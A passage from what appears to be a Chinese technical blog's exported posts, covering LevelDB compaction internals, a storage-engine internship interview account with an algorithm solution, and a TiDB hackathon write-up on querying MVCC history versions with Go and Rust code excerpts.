就是前面提到过的，对一个文件的 Get 和 DBIter 操作数达到上限后会设置这个文件为需要 compact 的文件（file_to_compact）。 对于 size_compaction，如果是启动后第一次进行 compaction，则选择该 level 的第一个文件。如果之前该 level 已经经历过 compaction 了，那么在 VersionSet::compact_pointer_[level] 中会存下上一次的 compaction 的最后一个 key ，本次 compaction 会选择此 key 之后的第一个文件，更准确地来说，会选择该 level 第一个最大 key 大于 compact_pointer_[level] 的文件；如果不存在这样的文件，则选择该 level 的第一个文件。对于这个策略，在 LevelDB 实现文档 中的描述为： Compactions for a particular level rotate through the key space. In more detail, for each level L, we remember the ending key of the last compaction at level L. The next compaction for level L will pick the first file that starts after this key (wrapping around to the beginning of the key space if there is no such file). 相关源码为： 123456789101112131415161718192021222324252627282930313233343536373839404142// db/version_set.ccCompaction* VersionSet::PickCompaction() &#123; Compaction* c; int level; // We prefer compactions triggered by too much data in a level over // the compactions triggered by seeks. const bool size_compaction = (current_-&gt;compaction_score_ &gt;= 1); const bool seek_compaction = (current_-&gt;file_to_compact_ != nullptr); if (size_compaction) &#123; level = current_-&gt;compaction_level_; assert(level &gt;= 0); assert(level + 1 &lt; config::kNumLevels); c = new Compaction(options_, level); // Pick the first file that comes after compact_pointer_[level] for (size_t i = 0; i &lt; current_-&gt;files_[level].size(); i++) &#123; FileMetaData* f = current_-&gt;files_[level][i]; if (compact_pointer_[level].empty() || icmp_.Compare(f-&gt;largest.Encode(), compact_pointer_[level]) &gt; 0) &#123; c-&gt;inputs_[0].push_back(f); break; &#125; &#125; if (c-&gt;inputs_[0].empty()) &#123; // Wrap-around to the beginning of the key space c-&gt;inputs_[0].push_back(current_-&gt;files_[level][0]); &#125; &#125; else if (seek_compaction) &#123; level = current_-&gt;file_to_compact_level_; c = new Compaction(options_, level); c-&gt;inputs_[0].push_back(current_-&gt;file_to_compact_); &#125; else &#123; return nullptr; &#125; SetupOtherInputs(c); return c;&#125; 其他细节： 上面代码中的 c-&gt;inputs_ 是两个的 FieldMetaData* 数组，代表 level 与 level+1 的 compaction inputs。 如果要 compaction 的 level-0，则会继续把 level-0 中与 c-inputs_[0] 中有 overlap 的所有文件也加入 c-&gt;inputs 中。还有一个注意的点，在计算 overlapping 的文件时，会逐步扩增 key 的范围直至最大，每一次扩增会重零开始收集 overlapping 的文件。 注意到最后还调用了一个 VersionSet::SetupOtherInputs 方法来获取所有 compaction 所需要的 inputs。这里面也是细节满满，主要目的是尽可能多地选择更多文件进行 compaction： 如果 inputs 中的一个文件的上界等于该 level 中的某一个文件的下界，需要把该文件也加入 inputs 中。这里可能会有个疑惑，就是按理来说同一层（除了 level-0）的 SST 应该不会出现这种情况，其实这种情况是可能出现的，因为 LevelDB 支持了快照（Snapshot）的功能，所以在有快照存在的情况下，同一层的 SST 之间是可能存在重复的 key 的（user_key 相同，seq不同）。这种情况下，这两个文件如果不一起合并，则可能会导致后续的 Get 操作读到旧数据。 初步拿到两层的 inputs 之后，会通过现在总的上界和下界去继续扩大 level 的文件范围，然后再继续扩大 level+1 文件的范围，由此反复，直到无法继续进行或总的要 compaction 的文件大小（level 和 level+1）达到上限：25 倍的 max_file_size（默认是 2MB）。 最后会将 level 的孙子（level+2）与最终的 inputs 有 overlapping 的文件记录下来供之后使用。 接下来就是正式的进行 compaction 了。由 DBImpl::DoCompactionWork 这个方法完成。先来看下 impl 文档的描述： A compaction merges the contents of the picked files to produce a sequence of level-(L+1) files. We switch to producing a new level-(L+1) file after the current output file has reached the target file size (2MB). We also switch to a new output file when the key range of the current output file has grown enough to overlap more than ten level-(L+2) files. This last rule ensures that a later compaction of a level-(L+1) file will not pick up too much data from level-(L+2). The old files are discarded and the new files are added to the serving state. 一般情况下很好理解，结合源码来看，首先会为 compaction inputs 生成一个 MergingIterator，这个迭代器的作用就i是每次返回一个最小最新的 key（这里还涉及 key 以及 user_key 的关系与编码，以及 comparator 的实现，之后再看）。在一般情况下，会构建一个新的 output 文件，将每次迭代的结构 add 到该文件中，如果这个 output 文件达到了 max_file_size（默认 2MB），便会将这个文件落盘，然后创建一个新的 output 文件，后续的 kv 继续添加到新文件中。在添加到新文件之前，需要判断是否该 key 是否已经加入了（最新的 key 会先加入）或者是否是 Delete 操作，这种 key 直接抛弃（不加入到 output 中）。 这里依然存在一些特殊情况与细节： 如果在归并过程中发现有新的 immutable MemTable 生成，需要先将其 dump 到 level-0。 如果在归并过程中发现与 level+2 层的 overlapping 过大，不用等到 max_file_size 就直接生成 output 文件，之后的 key 进入新 output 文件。 如果 level+2 层及更高层的 level 包含了某 key，那么此层的 compaction 不能直接丢弃掉 Delete 操作的 key。 做完 merge 之后会调用 DBImpl::InstallCompactionResults 标记需要删除的文件与新加入的文件，并进一步调用 VersionSet::LogAndApply 更新 DB 的元信息并重新评估各 level 的 score。最后再调用 DBImpl::CleanupCompaction 清理 compaction 过程占用的内存与 pending_outputs_ 解除对文件的锁定，最后在调用 DBImpl::RemoveObsoleteFiles 清理到上面说的标记为删除的文件，这样就完成了一次 compaction。 如何评估一个 level 是否该被 compaction最后快速看一下 VersionSet::Finalize 这个方法，这个方法会在 VersionSet::LogAndApply 和 VersionSet::Recover 中被调用，是在某个操作收尾时重新对所有 level 进行评估，来得出下一次 compaction 的 level。这个评估的策略非常简单，就是给每一层打分，每一层的分数就是该层的文件总大小除以该层的最大容量阈值（L层的阈值为 10^L MB），下一次 compaction 会选择分数最大的层。level-0 比较特殊，它的分数为文件数除以 config::kL0_CompactionTrigger（也就是 4）。 总结总结来说，一次 compaction 操作一般只会选择一个 level 的一个文件及其 overlap 的文件（除非 compaction 过程中生成了 immutable MemTable，这种情况会立即进行一次 minor compaction）。再一次 compaction 之后会立刻对所有 level 进行重新评估，然后再次调用 DBImpl::MaybeScheduleCompaction 查看是否还能继续 compaction，如果可以，则往后台任务队列提交一个新的 compaction 任务。这样看下来，LevelDB 的写放大问题还挺大的。 最后用伪代码简单梳理一下整个 compaction 的逻辑： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869// db/db_impl.ccvoid DBImpl::MaybeScheduleCompaction() &#123; // ... if (NeedCompaction()) &#123; // ... env_-&gt;Schedule(&amp;DBImpl::BGWork, this); &#125;&#125;void DBImpl::BGWork(void* db) &#123; reinterpret_cast&lt;DBImpl*&gt;(db)-&gt;BackgroundCall();&#125;void DBImpl::BackgroundCall() &#123; // ... BackgroundCompaction(); // ... MaybeScheduleCompaction(); // ...&#125; void DBImpl::BackgroundCompaction() &#123; if (imm_ != nullptr) &#123; CompactMemTable(); return; &#125; // ... c = versions_-&gt;PickCompaction(); // ... CompactionState *compact = new CompactionState(c); status = DoCompactionWork(compact); CleanupCompaction(compact); c-&gt;ReleaseInputs(); RemoveObsoleteFiles(); // ...&#125;Status DBImpl::DoCompactionWork(CompactionState* compact) &#123; // ... Iterator* input = versions_-&gt;MakeInputIterator(compact-&gt;compaction); // ... while (input-&gt;Valid()) &#123; if (HasImmutableMemTable()) &#123; DoMinorCompaction(); &#125; // ... if (!HasOutputFile()) &#123; NewOutputFile(); &#125; AddToOutput(input); if (OutputShouldFinish()) &#123; FinishCompactionOutputFile(compact, input); NewOutputFile(); &#125; // ... input-&gt;Next(); &#125; // ... InstallCompactionResults(compact); // ...&#125;Status DBImpl::InstallCompactionResults(CompactionState* compact) &#123; // ... AddDeleteFiles(); AddNewFiles(); return versions_-&gt;LogAndApply(compact-&gt;compaction-&gt;edit(), &amp;mutex_); // will call Finalize(v)&#125; 数据压缩的粒度是什么Block。进行 WriteBlock 时会调用 port::Snappy_Compress；进行 ReadBlock 时会调用 port::Snappy_Uncompress。 如何保证 snapshot 不被 compaction 掉在调用 DBImpl::DoCompactionWork 中会为 CompactionState 实例 compact 设置一个 smallest_snapshot 字段，如果 DBImpl 实例中有 snaphost，则将其设置为最老的那个 snaphost 的 seq，否则设置为最新的 seq。这个 smallest_snapshot 字段会在后续用于判断是否要删除这个 key，剩下的完整的逻辑就不言而喻了。 key 是如何组织和进行比较的在 MemTable 中，一条 kv 记录（entry）的格式是这样的： 123456Format of an entry is concatenation of:key_size : varint32 of internal_key.size()key bytes : char[internal_key.size()]tag : uint64((sequence &lt;&lt; 8) | type)value_size : varint32 of value.size()value bytes : char[value.size()] 由此可见，一个 entry 里还带有 seq，在比较（或者说做排序）的时候会同时依照 key (aka. user_key) 和 seq （其实还有 type，但是 user_key 和 seq 其实已经足够了）来判断。具体的策略是，按照 user_key 升序排列，同样的 user_key 按照 seq 降序排列（同样的 user_key 依照 type 降序排列，应该不会用到这个策略）。 在 SST 中，顺序是和 MemTable 中的顺序是一致的。 所以不管是在 MemTable 还是在 SST 中，都是相同的 user_key user_key 更小，seq 更大的在前面。举个例子，如果用 key_seq 来表示一个 entry，那么可能会存在这样的一个序列：k1_10, k1_7, k1_3, k2_11, k3_9….","tags":["数据库","存储","LSM-Tree","LevelDB"],"categories":["数据库","源码笔记"]},{"title":"2022年1月21日 Singularity Data 存储引擎工程师（实习）面经","path":"/2022-1-21-singularity-data-interview/","content":"2022年1月21日 Singularity Data 存储引擎工程师（实习）面经 提前总结由于是第一次面试这种基础软件的岗位，一开始有点小紧张，面对面试官的问题想尽快一股脑把想说的说出来，自己的思维及其跳跃，面试官问这个我直接延伸到另一个地方去了，导致在语言的组织上变得十分混乱，把面试官都给整蒙了，后面才渐渐稳定下来。 两次面试的面试官都很好，整个面试过程更像是一次技术交流，这也是我后面渐渐放开的原因。 简历上的一个败笔是带上了 MiniOB 这个项目。在面试中问到这个项目的时候，我才意识到，这个项目值得说的东西太少了，这整个项目也是个玩具级的软件，和真实的工业产品的设计理念大相径庭。在介绍项目的时候我就觉得很尴尬，面试过程中甚至产生了抵触情绪，我觉得面试官肯定也被我整尬了。 一面项目介绍首先就是 MiniOB。一开始大概介绍了整个项目的背景和整体的功能分布，然后由于我一开始的迷惑操作，导致在面试时直接开始了现场优化当时实现的功能。 首先是优化 NULL 类型的实现，我引入了一个叫 NULLMAP 的 BITMAP 来表示每一个记录中某一个字段是否是 NULL。这里由于我的思维有点跳跃导致面试官一开始没 get 到我的意思，便扯了一会儿皮。 然后介绍了下 TEXT 类型的实现，这里也由于我的思维混乱，被面试官指出了几个我实际上是实现了的但是没有说出来的要点。 最后又问了下我多表查询的实现。虽然当时这一部分是我实现的，但是我确实有点忘了。几经想打开源码复习一波，但是被面试官制止了。看了代码才想起来，是先把两张表查出来再做笛卡尔积，这里实现的大头是怎么实现笛卡尔积，但我面试时的时候直接忘了。 然后就是 TiDB Hackthon 的项目 MVCC 时光机。得益于头一天 TiDB Hackthon 获奖选手的采访，我对这个项目不管是我自己的部分还是其他人做的部分都比较熟悉，所以这一部分倒是信手拈来。我就一五一十地告诉面试官我负责的 MVCC Query 是如何实现地。 算法题Leetcode 230.二叉搜索树中第K小的元素，一开始没看到二叉搜索树所以想用搜索+最小堆来做。后来发现这不是二叉搜索树嘛，那直接中序遍历到第 k 个节点不就行了。比较简单，没什么好说的。 分布式哈希表的设计这里面试官想要的设计是，客户端直接请求到存储节点，而不是通过一个统一的 master 来请求。我 get 到面试官的意思后就想到的是一致性哈希，但是为了不让面试官认为我是个背题家，就没有提到一致性哈希。后来一想，面试官可能就是想听到一致性哈希，这么一来我还挺蠢的。 一些设计： client 首先从 master 获取到所有存储节点的分布等元信息，并维持在 client 的 cache 中。 client 中缓存了各个节点的地址信息与哈希算法。 当请求某个节点失败时向 master 请求更新节点信息。如果使用一致性哈希算法怎么不需要这么做。 提问问了一些流式数据库的设计与实现，它们与传统数据库的区别。 二面自我介绍二面一开始进行了一些自我介绍，我的学历，专业，并介绍了在分布式与数据库领域中我的一些学习和工作。 实习经历介绍一开始介绍了在字节的实习经历。面试官问了云游戏平台的一些具体实现。 然后介绍了在腾讯实习的工作。QQ 频道消息通知的开发经历，以及 QQ 频道机器人的一些实现，最后是 QQ 频道机器人平台的介绍。 面试官也和我交流了他认为应该怎么设计这些系统。 项目介绍又将 MiniOB 与 MVCC 时光机介绍了一遍。不过这次 MVCC 时光机讲的更多，把 FLASHBACK 和 GC 相关的功能也讲了。 LSM-Tree 相关感觉应该是从 TiKV 延伸到 RocksDB 再延伸过来的，主要问了这些问题： LSM-Tree 的整体结构，以及各个部分的结构。 LSM-Tree 操作的 workflow。 LSM-Tree 的一个 SST 中是否会有重复的 key。不同的 SST 中会有吗。对于前者，显然是不会；对于后者，面试官说得看具体实现，不含重复 key 的实现是有的。 存储系统宕机之后怎么办。 算法题给两个等长的 01 数组，找出它们拥有相同 01 个数的最大公共下标区间的长度。比如 101 与 010，它们的相同 01 个数的最大公共下标区间为 [0, 1]，长度为 2（10 与 01）。要求时间复杂度为 O(n)。 利用前缀和可以轻松找到 O(n^2) 的算法。但是要求 O(n)，所以需要继续优化。 经面试官的提示，得出以下算法（以 A = [0,0,1,1] 与 B = [1,1,0,1] 为例）： C = A - B = [-1,-1,1,0]。问题转换为 C 的最长的和为 0 的子数组。 求得 C 数组的前缀和数组 p = [-1,-2,-1,-1]，向 p 最前面增加一个 0 得到 P = [0,-1,-2,-1,-1]。问题转换为在 P 中找到两个下标 i, j (i &lt;= j) 使得 P[i] == P[j]，怎么答案 ans = max(j - i + 1)（此例子中为 3）。一些细节： 正确性：前缀和数组两个元素相同代表它们之间的所有元素的和为 0。 为什么要填一个 0：处理前缀和数组中有元素为 0 的情况。 具体实现可以依靠哈希表，前缀和数组也不用真正的创建，迭代一个变量即可。 Python 实现： 123456789101112def func(A: List[int], B: List[int]) -&gt; int: C = [A[i] - B[i] for i in range(len(A))] presum = 0 hashmap = &#123;0: -1&#125; ans = 0 for i in range(len(C)): presum += C[i] if presum not in hashmap: hashmap[presum] = i else: ans = max(ans, i - hashmap[presum] + 1) return ans 最后面试官问我想做存储还是计算，我说存储。然后他又问了下可以做计算吗，了解过计算吗？看来是想让我做计算相关的。我说了解的不多，他说没关系。 最后问我会不会 Rust，答曰”会“。 结束。","tags":["存储","Singularity Data"],"categories":["面经"]},{"title":"TiDB Flashback 之 MVCC Query 的实现思路","path":"/tidb-flash-mvcc-query/","content":"有幸和 @disking 与 @JmPotato 两位哥哥一同参加了今年（2021）TiDB 社区举办的 Hackthon。我们的项目简单来说就是基于 TiDB 的 MVCC 的特性实现一些新的功能。项目的 RFC 文档：https://github.com/Long-Live-the-DoDo/rfc 。 在本项目我负责第一个功能点：MVCC Query in SQL。简单来说就是为 TiDB 的数据表增加两个虚拟列 _tidb_mvcc_ts 与 _tidb_mvcc_op。众所周知，TiDB 中每一个数据表中的数据都是以 Key-Value 的形式存放在 TiKV 中，Key 是一条行记录的标识，它带有 MVCC 版本信息（ts）；而 Value 就是这一条行记录的具体内容，它多列的数据拼接而成。TiDB 在读取数据时只会读取当前事务下能看到的最新数据，而我要做的就是能让它看到所有版本的数据。 一言以蔽之，我要实现的便是当 SQL 语句中存在 _tidb_mvcc_ts 或 _tidb_mvcc_op 两列时，会查询到所有的历史版本（以及它们的 MVCC 时间戳与操作类型）。 准备工作除了 TiDB 与 TiKV 的开发环境准备之外，需要做的一个准备工作就是了解 TiDB 和 TiKV 的代码结构与它们的数据流，也就是要去大致了解它们的源码，而这也是最耗时间的一个过程，所以我的代码量并不大，但是却花了很长时间才写完。 于是我根据我需要改动的部分，结合 PingCAP 的官方博客，对源码进行了一波学习： Select 流程： TiDB 源码阅读系列文章（三）SQL 的一生 TiDB 源码阅读系列文章（六）Select 语句概览 如何将查询下推到 TiKV 并执行： TiKV 源码解析系列文章（十四）Coprocessor 概览 TiKV 源码解析系列文章（十六）TiKV Coprocessor Executor 源码解析 Insert 流程： TiDB 源码阅读系列文章（四）Insert 语句概览 TiDB 源码阅读系列文章（十六）INSERT 语句详解 一条 SQL 语句的具体执行流程： TiDB 源码阅读系列文章（二十三）Prepare/Execute 请求处理 TiKV MVCC 读写流程： TiKV 源码解析系列文章（十三）MVCC 数据读取 MVCC 信息查询功能TiDB 侧实现TiDB 负责 SQL 语句的解析与查询计划的构建。所以 TiDB 侧的修改主要分为两个部分：第一个是查询计划构建引入虚拟列，第二个是提示 TiKV 需要读取所有版本的数据。下图是 TiDB 中需要修改的部分： 查询计划构建引入虚拟列以 1select _tidb_mvcc_ts from t; 为例，当 PlanBuilder 读取到 t 时，它会调用 buildDataSource 为查询计划构造逻辑上的数据源（也就是要查询的表），如果这里不做任何处理，当 TiDB 执行前进行各种元信息（比如查询的列是否存在等）时就会认为 _tidb_mvcc_ts 不是表 t 的列，从而执行失败，所以我们只需要在 buildDataSource 的时候加入虚拟列即可，让 TiDB 认为这个表就是有 _tidb_mvcc_ts 和 _tidb_mvcc_op 这两列的： 12345678910111213141516171819202122232425262728// planner/core/logical_plan_builder.gofunc (b *PlanBuilder) buildDataSource(ctx context.Context, tn *ast.TableName, asName *model.CIStr) (LogicalPlan, error) &#123; // ... // add _tidb_mvcc_ts to columns. mvccTsCol := ds.newExtraMVCCTsSchemaCol() ds.Columns = append(ds.Columns, model.NewExtraMVCCTsColInfo()) schema.Append(mvccTsCol) names = append(names, &amp;types.FieldName&#123; DBName: dbName, TblName: tableInfo.Name, ColName: model.ExtraMVCCTsName, OrigColName: model.ExtraMVCCTsName, &#125;) ds.TblCols = append(ds.TblCols, mvccTsCol) // add _tidb_mvcc_op to columns. mvccOpCol := ds.newExtraMVCCOpSchemaCol() ds.Columns = append(ds.Columns, model.NewExtraMVCCOpColInfo()) schema.Append(mvccOpCol) names = append(names, &amp;types.FieldName&#123; DBName: dbName, TblName: tableInfo.Name, ColName: model.ExtraMVCCOpName, OrigColName: model.ExtraMVCCOpName, &#125;) ds.TblCols = append(ds.TblCols, mvccOpCol) // ...&#125; 其中与 MVCC 有关的数据结构与函数都是本次新加入的。 NeedMvcc 标志我在查询计划构建的过程中引入了 NeedMvcc 标志来标记本次查询是否需要 MVCC 信息。具体来说，是在遍历语法树生成查询计划时，如果遇到了 _tidb_mvcc_ts 或 _tidb_mvcc_op，则将这个标识即为 true。这里的实现比较简单粗暴，直接将 NeedMvcc 存到了 SessionCtx 中，也就是存到了整个 Session 的上下文中（所以用完之后需要清理为 false）。我觉得更优雅的方式是存放到 LogicPlan 与 PhysicPlan 中，然后层层传递到 Executor，但为了简单快捷的实现，我就直接放到了会话上下文中。 设置 NeedMvcc 具体发生在 exoressionRewriter 这个 Visitor 执行 Leave 时，如果它需要接受的原本的语法树节点是 ast.ColumnNameExpr 类型，也就是列名时，我们可以检查这个列名是否是 _tidb_mvcc_ts 或 _tidb_mvcc_op，如果是，则将 NeedMvcc 设置为 true，否则不变： 123456789101112131415// planner/core/expression_rewriter.go// Leave implements Visitor interface.func (er *expressionRewriter) Leave(originInNode ast.Node) (retNode ast.Node, ok bool) &#123; // ... case v := inNode.(type) &#123; // ... case *ast.ColumnNameExpr: if v.Name.Name.L == model.ExtraMVCCOpName.L || v.Name.Name.L == model.ExtraMVCCTsName.L &#123; er.sctx.GetSessionVars().NeedMvcc = true &#125; // ... &#125; // ...&#125; 接下来就是在通过物理计划构造 Executor 并构造对 TiKV 的 RPC 请求时，加入 NeedMVCC 这个标识字段即可： 1234567891011121314151617181920212223// planner/core/plan_to_pb.go// ToPB implements PhysicalPlan ToPB interface.func (p *PhysicalTableScan) ToPB(ctx sessionctx.Context, storeType kv.StoreType) (*tipb.Executor, error) &#123; tsExec := tables.BuildTableScanFromInfos(p.Table, p.Columns, ctx.GetSessionVars().NeedMvcc) // clear the need mvcc flag ctx.GetSessionVars().NeedMvcc = false // ...&#125;// table/tables/tables.go// BuildTableScanFromInfos build tipb.TableScan with *model.TableInfo and *model.ColumnInfo.func BuildTableScanFromInfos(tableInfo *model.TableInfo, columnInfos []*model.ColumnInfo, needMvcc bool) *tipb.TableScan &#123; pkColIds := TryGetCommonPkColumnIds(tableInfo) tsExec := &amp;tipb.TableScan&#123; TableId: tableInfo.ID, Columns: util.ColumnsToProto(columnInfos, tableInfo.PKIsHandle), PrimaryColumnIds: pkColIds, NeedMvcc: needMvcc, &#125; // ...&#125; 接下来就可以交给 TiKV 来管了。对于 SQL 语句中的投影，选择等操作，无需修改，本身是兼容的。只要我们能够拿到想要的数据，构造好了想要的数据表 Schema，就可以实现剩余的功能。 其他由于在后续 TiKV 读取行数据写入 MVCC 信息的实现中（见下文），采用了原始的简单编码方式（colID1 typed_value1 colID2 typed_value…），所以需要统一 TiDB 和 TiKV 的存储数据编解码方式。为了简单起见，我直接抛弃了 TiDB 新引入的编码方式： 123456789101112131415// tablecodec/tablecodec.go// EncodeRow encode row data and column ids into a slice of byte.// valBuf and values pass by caller, for reducing EncodeRow allocates temporary bufs. If you pass valBuf and values as nil,// EncodeRow will allocate it.func EncodeRow(sc *stmtctx.StatementContext, row []types.Datum, colIDs []int64, valBuf []byte, values []types.Datum, e *rowcodec.Encoder) ([]byte, error) &#123; if len(row) != len(colIDs) &#123; return nil, errors.Errorf(&quot;EncodeRow error: data and columnID count not match %d vs %d&quot;, len(row), len(colIDs)) &#125; // For hackthon: disable the new encoding mode. // if e.Enable &#123; // return e.Encode(sc, colIDs, row, valBuf) // &#125; return EncodeOldRow(sc, row, colIDs, valBuf, values)&#125; 具体修改见：https://github.com/Long-Live-the-DoDo/tidb/pull/1 。 TiKV 侧实现通过阅读 Coprocessor 的相关源码可以得知，整个 select 语句的执行过程可以大致拆分为： 构造 executor 及其中的 scanner 首先通过通过 build_executors 构造 executor。由于 select 语句对应的是 ExecType::TypeTableScan，所以相应的 executor 会通过 BatchTableScanExecutor::new 生成。而 build_executors 这里可以获取到 TiDB 发来的 RPC 请求，我们便可以从请求中提取出 NeedMvcc 字段传给 BatchTableScanExecutor 以便后续使用。 在 BatchTableScanExecutor 中，又会调用 ScanExecutor::new 生成一个 scanner wrapper。于是再将依次将 NeedMvcc 传递给 ScanExecutor 这个 wrapper。 由于 ScanExecutor 只是个 wrapper，所以它还会将内部的实际 scanner 定义为 RangeScanner。于是再将 NeedMvcc 传递给 RangeScanner 保存起来。当之后 RangeScanner 执行 scan 逻辑时便可以获取到 NeedMvcc 了。 第一次 scan 时，RangeScanner 会通过会调用内部成员 storage 的 begin_scan 接口。而 RangeScanner 中的 storage 实际上是 TiKVStorage。 在 TiKVStorage::begin_scan 中，又会根据 TiKVSttorage&lt;S: Store&gt; 的内部成员 store: S 的类型生成其对应的 scanner。这里的 store 其实是 SnapshotStore。TiKVStorage 会通过 SnapshotStore::scanner 生成最终访问物理存储的 scanner。于是 NeedMvcc 就可以通过 begin_scan 函数调用传递给 SnapshotStore::scanner 构造相应的 scanner 了。 SnapshotStore::scanner 通过 ScannerBuilder 按照需求构造相应的 scanner。在原本的实现了两种 scanner：Scanner::Forward 与 Scanner::Backward，分别用于顺序和逆序扫描，并提供 next 接口返回每一次迭代读到的 Key-Value 值。于是我就知道了，我这里需要新增一个 Scanner::ForwardWithMvcc 来用于在顺序扫描中返回所有版本的 Key-Value。 我找到这条调用链其实是个逆序的过程，先找到最基本的 scanner，再向上溯源找到最基本的调用者。 scanner 迭代获取数据 构造完 executor 后就可以开始执行了。对于 select 也就是 TableScan 来说，对于每一行数据的读取实际上就是不断调用 ForwardScanner::read_next 这个方法（拿顺序遍历举例）。 read_next 方法会按照 Key 遍历 write 列族拿到 write 的值，然后再通过 handle_write 方法执行迭代器读取数据的实际逻辑。所以说，我们最终的目的就是为 Scanner::ForwardWithMvcc 实现它的 handle_write 方法。 handle_write 的执行逻辑因 Scanner 采用的 ScanPolicy 而异。我们要实现的 WithMvccInfoPolicy 和原本的 Scanner::Forward 使用的 LatestKvPolicy 基本完全一致。LatestKvPolicy 遇到某 user key 的最新版本 value 时，会返回这个 value，并通过调用 123456789101112131415161718192021// src/storage/mvcc/reader/scanner/forward.rsimpl&lt;S: Snapshot&gt; ScanPolicy&lt;S&gt; for LatestKvPolicy &#123; fn handle_write( &amp;mut self, current_user_key: Key, _: TimeStamp, cfg: &amp;mut ScannerConfig&lt;S&gt;, cursors: &amp;mut Cursors&lt;S&gt;, statistics: &amp;mut Statistics, ) -&gt; Result&lt;HandleRes&lt;Self::Output&gt;&gt; &#123; // find the next value // ... cursors.move_write_cursor_to_next_user_key(&amp;current_user_key, statistics)?; // return the value Ok(match value &#123; Some(v) =&gt; HandleRes::Return((current_user_key, v)), _ =&gt; HandleRes::Skip(current_user_key), &#125;) &#125; &#125; 跳过这个 user key 之下所有之前的老版本。在 WithMvccInfoPolicy 下，我们并不采用这个逻辑，而是继续往下读。 12345678910111213141516171819202122232425262728293031323334// src/storage/mvcc/reader/scanner/forward.rsimpl&lt;S: Snapshot&gt; ScanPolicy&lt;S&gt; for WithMvccInfoPolicy &#123; fn handle_write( &amp;mut self, current_user_key: Key, commit_ts: TimeStamp, cfg: &amp;mut ScannerConfig&lt;S&gt;, cursors: &amp;mut Cursors&lt;S&gt;, statistics: &amp;mut Statistics, ) -&gt; Result&lt;HandleRes&lt;Self::Output&gt;&gt; &#123; // find the next value // ... // do not move write cursor to next user key, // but move to next key. cursors.write.next(&amp;mut statistics.write); // add mvcc info and return the value Ok(match value &#123; Some(mut v) =&gt; &#123; self.append_row_with_mvcc_info(&amp;mut v, commit_ts, write_type)?; HandleRes::Return((current_user_key, v)) &#125; _ =&gt; &#123; if write_type == WriteType::Delete &#123; let mut v = vec![]; self.append_row_with_mvcc_info(&amp;mut v, commit_ts, write_type)?; HandleRes::Return((current_user_key, v)) &#125; else &#123; HandleRes::Skip(current_user_key) &#125; &#125; &#125;) &#125;&#125; WithMvccInfoPolicy 还有一点不同的是，遇到 Delete 的时，它也会返回一个 value。 WithMvccInfoPolicy 中的 handle_write 在返回 value 之前，还需要为 value 中添加入 _tidb_mvcc_ts 与 _tidb_mvcc_op 这两个虚拟列的数据。就像上面 TiDB 侧的实现中所说，这里采用了一种简单粗暴的编码方式，直接将 [colID, typed_value] 依次编码进最后的 value 字节数组中。 1234567891011121314151617181920212223242526impl WithMvccInfoPolicy &#123; fn append_row_with_mvcc_info( &amp;self, value: &amp;mut Value, commit_ts: TimeStamp, write_type: WriteType, ) -&gt; codec::Result&lt;()&gt; &#123; // append mvcc_ts_col_id codec::number::NumberEncoder::write_u8(value, VAR_INT_FLAG)?; codec::number::NumberEncoder::write_var_i64(value, EXTRA_MVCC_TS_COL_ID)?; // append mvcc_ts codec::number::NumberEncoder::write_u8(value, VAR_UINT_FLAG)?; codec::number::NumberEncoder::write_var_u64(value, commit_ts.physical())?; // append mvcc_op_col_id codec::number::NumberEncoder::write_u8(value, VAR_INT_FLAG)?; codec::number::NumberEncoder::write_var_i64(value, EXTRA_MVCC_OP_COL_ID)?; // append mvcc_op codec::number::NumberEncoder::write_u8(value, COMPACT_BYTES_FLAG)?; codec::byte::CompactByteEncoder::write_compact_bytes( value, &amp;write_type.to_string().as_bytes().to_vec(), )?; value.shrink_to_fit(); std::result::Result::Ok(()) &#125;&#125; 具体修改见：https://github.com/Long-Live-the-DoDo/tikv/pull/1 。 基于 MVCC 信息的 RawUpdate 功能这个功能是一个附加的功能，比较好玩，实现上也非常的 hack。我们允许用户通过 SQL 语句来对某一个 Version 下的一条记录直接进行更改，也就是调用 TiKV 的 RawPut 接口，不进行事务相关的操作。 具体来说，当用户输入这样一个 SQL： 1update t set a = 2 where _tidb_mvcc_ts = xxxx; 时，不会进行正常的 TiKV 的 KV 读写流程，也就是不会增加一条 Put 记录，而是在原来的记录上进行更改。 TiDB 侧实现与 MVCC Query 类似，我们需要一个标识来表示这次是 RawUpdate，来让执行过程进入新的执行分支。这次是在构建 Plan 的时候往 Plan 里放一个标识字段： 12345678910111213// planner/core/logical_plan_builder.gofunc (b *PlanBuilder) buildUpdate(ctx context.Context, update *ast.UpdateStmt) (Plan, error) &#123; // ... updt := Update&#123; OrderedList: orderedList, AllAssignmentsAreConstant: allAssignmentsAreConstant, VirtualAssignmentsOffset: len(update.List), RawUpdate: b.ctx.GetSessionVars().NeedMvcc, &#125;.Init(b.ctx) // ... return updt, err&#125; 这个参数会一直传递到物理计划的构建与执行中。然后就是具体的执行逻辑，这里的实现比较 hack。我是直接通过阅读 TiKV 源码后依葫芦画瓢在 TiDB 侧手动构造一个编码后的 Key 和 Value，然后通过 tikv/client-go 提供的 RawPutWithCF 接口直接进行写 KV 操作。使用 RawPut 不会进入 MVCC 事务流程，就相当于 KV 表的直接更新。 首先从旧的 row 中获取 MVCC 信息用于后续组装 Raw Key 和 Value： 12345678910111213141516171819202122232425262728293031// executor/update.go func (e *UpdateExec) exec(ctx context.Context, schema *expression.Schema, row, newData []types.Datum) error &#123; // ... commitTs := uint64(0) op := byte(&#x27;P&#x27;) if e.rawUpdate &#123; for j, col := range schema.Columns &#123; if col.ID == model.ExtraMVCCTsID &#123; commitTs = row[j].GetUint64() &#125; else if col.ID == model.ExtraMVCCOpID &#123; op = row[j].GetString()[0] &#125; &#125; &#125; // Update row changed, err1 := updateRecord( ctx, e.ctx, handle, oldData, newTableData, flags, tbl, false, e.memTracker, e.rawUpdate, commitTs, op) // ...&#125; 然后利用 MVCC 信息构造 Raw 请求： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748// table/tables/tables.go// RawUpdateRecord is similar to UpdateRecord, but use RawPut.func (t *TableCommon) RawUpdateRecord(ctx context.Context, sctx sessionctx.Context, h kv.Handle, oldData, newData []types.Datum, touched []bool, commitTs uint64, op byte) error &#123; // ... key := t.RecordKey(h) encodedKey := codec.EncodeBytes([]byte&#123;&#125;, key) // compose the writeCF key commitTsBytes := make([]byte, 8) if commitTs == 0 &#123; return nil &#125; binary.BigEndian.PutUint64(commitTsBytes, ^commitTs) encodedKey = append(encodedKey, commitTsBytes...) sc, rd := sessVars.StmtCtx, &amp;sessVars.RowEncoder value, err := tablecodec.EncodeRow(sc, row, colIDs, nil, nil, rd) if err != nil &#123; 